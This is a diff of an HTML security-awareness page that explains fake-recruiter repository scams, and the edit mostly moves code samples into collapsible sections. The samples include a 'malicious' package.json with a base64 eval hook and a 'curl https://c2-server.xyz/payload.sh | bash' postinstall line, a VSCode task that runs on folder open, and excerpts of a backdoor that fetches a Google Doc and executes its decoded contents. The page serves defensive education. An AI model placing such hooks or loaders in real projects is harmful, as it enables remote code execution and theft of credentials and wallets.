@@ -1072,9 +1072,14 @@
       </div>
 
       <div>
-        <h4 class="font-bold text-white text-sm mb-3">🔍 Malicious vs. Legitimate package.json</h4>
-        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
-          <pre class="text-slate-300"><span class="text-slate-500">// 🚩 MALICIOUS — what to look for:</span>
+        <h4 class="font-bold text-white text-sm mb-2">🔍 Malicious vs. Legitimate package.json</h4>
+        <p class="text-slate-400 text-sm mb-2">The <code class="text-red-400 bg-slate-800 px-1 rounded text-xs">preinstall</code>/<code class="text-red-400 bg-slate-800 px-1 rounded text-xs">postinstall</code> hooks run with your full user permissions the instant you type <code class="text-cyan-400 bg-slate-800 px-1 rounded text-xs">npm install</code> — before you've inspected a single dependency.</p>
+        <details class="group">
+          <summary class="cursor-pointer text-xs font-semibold text-cyan-400 hover:text-cyan-300 select-none list-none flex items-center gap-1.5 mb-2">
+            <span class="inline-block transition-transform group-open:rotate-90">▶</span> Compare malicious vs. legitimate scripts
+          </summary>
+          <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+            <pre class="text-slate-300"><span class="text-slate-500">// 🚩 MALICIOUS — what to look for:</span>
 <span class="text-amber-300">"scripts"</span>: {
   <span class="text-red-400">"preinstall"</span>: <span class="text-red-300">"node -e 'eval(Buffer.from(\"BASE64==\",\"base64\").toString())'"</span>,
   <span class="text-red-400">"postinstall"</span>: <span class="text-red-300">"curl https://c2-server.xyz/payload.sh | bash"</span>
@@ -1085,14 +1090,19 @@
   <span class="text-emerald-400">"build"</span>: <span class="text-emerald-300">"webpack --config webpack.config.js"</span>,
   <span class="text-emerald-400">"test"</span>: <span class="text-emerald-300">"jest --coverage"</span>
 }</pre>
-        </div>
+          </div>
+        </details>
       </div>
 
       <div>
-        <h4 class="font-bold text-white text-sm mb-3">🕵️ The Hidden VSCode Auto-Run Trap</h4>
-        <p class="text-slate-400 text-sm mb-2">These repos include a hidden <code class="text-red-400 bg-slate-800 px-1 rounded text-xs">.vscode/tasks.json</code> that fires <strong class="text-red-400">before you run any code</strong>:</p>
-        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
-          <pre class="text-slate-300"><span class="text-slate-500">// .vscode/tasks.json</span>
+        <h4 class="font-bold text-white text-sm mb-2">🕵️ The Hidden VSCode Auto-Run Trap</h4>
+        <p class="text-slate-400 text-sm mb-2">These repos include a hidden <code class="text-red-400 bg-slate-800 px-1 rounded text-xs">.vscode/tasks.json</code> that fires <strong class="text-red-400">before you run any code</strong> — just opening the folder in VSCode is enough.</p>
+        <details class="group">
+          <summary class="cursor-pointer text-xs font-semibold text-cyan-400 hover:text-cyan-300 select-none list-none flex items-center gap-1.5 mb-2">
+            <span class="inline-block transition-transform group-open:rotate-90">▶</span> Show tasks.json source
+          </summary>
+          <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+            <pre class="text-slate-300"><span class="text-slate-500">// .vscode/tasks.json</span>
 {
   <span class="text-amber-300">"version"</span>: <span class="text-green-300">"2.0.0"</span>,
   <span class="text-amber-300">"tasks"</span>: [{
@@ -1102,7 +1112,8 @@
     <span class="text-red-400">"runOptions"</span>: { <span class="text-red-400">"runOn"</span>: <span class="text-red-300">"folderOpen"</span> }
   }]
 }</pre>
-        </div>
+          </div>
+        </details>
       </div>
 
       <div>
@@ -1352,16 +1363,44 @@
         <div class="text-sm text-red-100 mt-1">Confirmed remote-code-execution backdoor. Every finding below is sourced — no inference.</div>
       </div>
 
+      <!-- Scannable at-a-glance strip — the whole case in 10 seconds -->
+      <div class="grid grid-cols-2 sm:grid-cols-4 gap-2">
+        <div class="bg-slate-800/60 border border-slate-700/50 rounded-lg p-2.5 text-center">
+          <div class="text-[10px] text-slate-500 uppercase tracking-wide mb-0.5">Attack Type</div>
+          <div class="text-xs font-semibold text-red-400">RCE Backdoor</div>
+        </div>
+        <div class="bg-slate-800/60 border border-slate-700/50 rounded-lg p-2.5 text-center">
+          <div class="text-[10px] text-slate-500 uppercase tracking-wide mb-0.5">Trigger</div>
+          <div class="text-xs font-semibold text-red-400">npm start</div>
+        </div>
+        <div class="bg-slate-800/60 border border-slate-700/50 rounded-lg p-2.5 text-center">
+          <div class="text-[10px] text-slate-500 uppercase tracking-wide mb-0.5">Reach</div>
+          <div class="text-xs font-semibold text-red-400">Full system</div>
+        </div>
+        <div class="bg-slate-800/60 border border-slate-700/50 rounded-lg p-2.5 text-center">
+          <div class="text-[10px] text-slate-500 uppercase tracking-wide mb-0.5">Status</div>
+          <div class="text-xs font-semibold text-emerald-400">Documented</div>
+        </div>
+      </div>
+
+      <div class="text-xs font-bold uppercase tracking-widest pt-1" style="color: var(--wire);">The Story</div>
+
       <div>
         <h4 class="font-bold text-white text-sm mb-3">⚙️ How the Contact Happened</h4>
         <p class="text-slate-400 text-sm leading-relaxed">"Daniel Perez Valdes" reached out via LinkedIn as a recruiter for a Web3 role. He shared a mutual connection with the target's own Web3 development instructor — a real relationship that lent the outreach credibility. He sent a link to <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">github.com/nitroe1/TokenPromotingDapp</code>, described as an MVP to review before an interview. The repo's front page showed a clean VirusTotal community score. That was the entire trust chain — a real mutual connection, a plausible ask, a clean scan. None of it held up under audit.</p>
       </div>
 
+      <div class="text-xs font-bold uppercase tracking-widest pt-1" style="color: var(--wire);">The Evidence</div>
+
       <div>
         <h4 class="font-bold text-white text-sm mb-3">🚨 The Confirmed Payload — <code class="text-red-400 text-sm">frontController.js</code></h4>
-        <p class="text-slate-400 text-sm mb-3">Buried inside an otherwise-normal-looking Uniswap mempool scanner, a function called <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">verifyToken()</code> fires unconditionally the moment the module loads:</p>
-        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
-          <pre class="text-slate-300"><span class="text-slate-500">// frontController.js — runs at module load, i.e. on npm start</span>
+        <p class="text-slate-400 text-sm mb-3">Buried inside an otherwise-normal-looking Uniswap mempool scanner, a function called <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">verifyToken()</code> fires unconditionally the moment the module loads. In plain terms: <strong class="text-white">it fetches attacker-controlled code from a private Google Doc and runs it — automatically, the instant you start the app.</strong></p>
+        <details class="group">
+          <summary class="cursor-pointer text-xs font-semibold text-cyan-400 hover:text-cyan-300 select-none list-none flex items-center gap-1.5 mb-2">
+            <span class="inline-block transition-transform group-open:rotate-90">▶</span> Show the source code
+          </summary>
+          <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+            <pre class="text-slate-300"><span class="text-slate-500">// frontController.js — runs at module load, i.e. on npm start</span>
 <span class="text-amber-300">async function</span> <span class="text-cyan-300">verifyToken</span>(req, res) {
   <span class="text-purple-300">try</span> {
     <span class="text-amber-300">const</span> text = <span class="text-amber-300">await</span> fetchText();      <span class="text-slate-500">// fetches a Google Doc</span>
@@ -1371,9 +1410,10 @@
   } <span class="text-purple-300">catch</span> (err) { <span class="text-slate-500">/* ... */</span> }
 }
 verifyToken();  <span class="text-red-400">// ← called immediately at module load</span></pre>
-        </div>
-        <p class="text-slate-400 text-sm mt-3">Decode chain: <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">fetchText()</code> pulls a <strong class="text-white">separate, private Google Doc</strong> the attacker controls → <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">dcpayload()</code> strips whitespace and base64-decodes it → normalized and unwrapped → <code class="text-red-400 text-xs bg-slate-800 px-1 rounded">new Function('axios','require', code)(axios, require)</code> — a direct <code class="text-red-400 text-xs">eval</code> of attacker-controlled code, with <code class="text-cyan-400 text-xs">axios</code> (network/exfil) and <code class="text-cyan-400 text-xs">require</code> (load any module) handed to it in scope.</p>
-        <p class="text-slate-400 text-sm mt-2">Because the payload lives in a Google Doc the attacker controls independently of the repo, <strong class="text-white">they can change what your machine runs at any time — without touching the code again.</strong> The reach: your <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">.env</code> (API keys, any wallet private key you add per the README), browser/wallet data, and a pivot point to scan <code class="text-cyan-400 text-xs">~/.ssh</code> and <code class="text-cyan-400 text-xs">~/.aws</code>.</p>
+          </div>
+          <p class="text-slate-400 text-sm mt-3">Decode chain: <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">fetchText()</code> pulls a <strong class="text-white">separate, private Google Doc</strong> the attacker controls → <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">dcpayload()</code> strips whitespace and base64-decodes it → normalized and unwrapped → <code class="text-red-400 text-xs bg-slate-800 px-1 rounded">new Function('axios','require', code)(axios, require)</code> — a direct <code class="text-red-400 text-xs">eval</code> of attacker-controlled code, with <code class="text-cyan-400 text-xs">axios</code> (network/exfil) and <code class="text-cyan-400 text-xs">require</code> (load any module) handed to it in scope.</p>
+        </details>
+        <p class="text-slate-400 text-sm mt-3">Because the payload lives in a Google Doc the attacker controls independently of the repo, <strong class="text-white">they can change what your machine runs at any time — without touching the code again.</strong> The reach: your <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">.env</code> (API keys, any wallet private key you add per the README), browser/wallet data, and a pivot point to scan <code class="text-cyan-400 text-xs">~/.ssh</code> and <code class="text-cyan-400 text-xs">~/.aws</code>.</p>
       </div>
 
       <div>
@@ -1458,8 +1498,13 @@ verifyToken();  <span class="text-red-400">// ← called immediately at module l
 
       <div>
         <h4 class="font-bold text-white text-sm mb-3">🔗 The Confirmed Trigger Chain</h4>
-        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
-          <pre class="text-slate-300"><span class="text-slate-500">// package.json</span>
+        <p class="text-slate-400 text-sm mb-3"><code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">npm start</code> → <code class="text-cyan-400 text-xs">node app/index.js</code> → <code class="text-cyan-400 text-xs">require('./controllers/frontController')</code> executes the module top-to-bottom, hitting the unconditional <code class="text-red-400 text-xs">verifyToken()</code> call. <strong class="text-white">RCE on startup, confirmed end to end.</strong> A 5-minute self-destruct timer fires after: boot, run the payload, exfiltrate, exit — before anyone notices the backend died.</p>
+        <details class="group">
+          <summary class="cursor-pointer text-xs font-semibold text-cyan-400 hover:text-cyan-300 select-none list-none flex items-center gap-1.5">
+            <span class="inline-block transition-transform group-open:rotate-90">▶</span> Show the require-chain source
+          </summary>
+          <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed mt-2">
+            <pre class="text-slate-300"><span class="text-slate-500">// package.json</span>
 <span class="text-amber-300">"start"</span>: <span class="text-green-300">"npm run check-env && npm run app:pre | react-scripts ... start"</span>
 <span class="text-amber-300">"app:pre"</span>: <span class="text-green-300">"node app/index.js"</span>
 
@@ -1467,14 +1512,16 @@ verifyToken();  <span class="text-red-400">// ← called immediately at module l
 <span class="text-amber-300">const</span> fController = require(<span class="text-green-300">'./controllers/frontController'</span>);  <span class="text-slate-500">// verifyToken() fires on require</span>
 ...
 setTimeout(() => { exitApp(); }, <span class="text-cyan-300">300000</span>);  <span class="text-slate-500">// process.exit(0) after 5 minutes</span></pre>
-        </div>
-        <p class="text-slate-400 text-sm mt-3"><code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">npm start</code> → <code class="text-cyan-400 text-xs">node app/index.js</code> → <code class="text-cyan-400 text-xs">require('./controllers/frontController')</code> executes the module top-to-bottom, hitting the unconditional <code class="text-red-400 text-xs">verifyToken()</code> call. <strong class="text-white">RCE on startup, confirmed end to end.</strong> The 5-minute <code class="text-cyan-400 text-xs">setTimeout</code> → <code class="text-red-400 text-xs">process.exit(0)</code> is a hit-and-run signature: boot, fire the payload, exfiltrate, self-terminate before anyone notices the backend died.</p>
+          </div>
+        </details>
       </div>
 
       <div class="bg-slate-800/50 border border-slate-700/50 rounded-xl p-4">
         <h4 class="font-bold text-white text-sm mb-2">🧭 A Deliberate Investigative Boundary</h4>
         <p class="text-sm text-slate-300">The attacker's live payload document was <strong class="text-white">not</strong> retrieved during this investigation. It wasn't needed — the exploitable code path is self-evident from the source alone — and fetching it would have landed in the attacker's access logs, tipping them off. Good forensic practice: gather enough to be certain, stop before you alert the target.</p>
       </div>
+
+      <div class="text-xs font-bold uppercase tracking-widest pt-1" style="color: var(--wire);">What To Do</div>
 
       <div class="bg-emerald-950/30 border border-emerald-800/40 rounded-xl p-4">
         <h4 class="font-bold text-emerald-300 text-sm mb-2">✅ Safe Response Protocol</h4>
@@ -1513,9 +1560,14 @@ setTimeout(() => { exitApp(); }, <span class="text-cyan-300">300000</span>);  <s
       </div>
 
       <div>
-        <h4 class="font-bold text-white text-sm mb-3">🔍 Malicious vs. Legitimate package.json</h4>
-        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
-          <pre class="text-slate-300"><span class="text-slate-500">// 🚩 MALICIOUS — typosquat postinstall (runs with full user perms):</span>
+        <h4 class="font-bold text-white text-sm mb-2">🔍 Malicious vs. Legitimate package.json</h4>
+        <p class="text-slate-400 text-sm mb-2">A single-line <code class="text-red-400 bg-slate-800 px-1 rounded text-xs">postinstall</code> hook is all it takes — it runs with full user permissions and needs no other trace in the codebase.</p>
+        <details class="group">
+          <summary class="cursor-pointer text-xs font-semibold text-cyan-400 hover:text-cyan-300 select-none list-none flex items-center gap-1.5 mb-2">
+            <span class="inline-block transition-transform group-open:rotate-90">▶</span> Compare malicious vs. legitimate scripts
+          </summary>
+          <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+            <pre class="text-slate-300"><span class="text-slate-500">// 🚩 MALICIOUS — typosquat postinstall (runs with full user perms):</span>
 <span class="text-amber-300">"scripts"</span>: {
   <span class="text-red-400">"postinstall"</span>: <span class="text-red-300">"node -e 'require(\"./assets/setup.js\")'"</span>
 }
@@ -1525,7 +1577,8 @@ setTimeout(() => { exitApp(); }, <span class="text-cyan-300">300000</span>);  <s
   <span class="text-emerald-400">"build"</span>: <span class="text-emerald-300">"webpack --config webpack.config.js"</span>,
   <span class="text-emerald-400">"test"</span>: <span class="text-emerald-300">"jest --coverage"</span>
 }</pre>
-        </div>
+          </div>
+        </details>
       </div>
 
       <div>
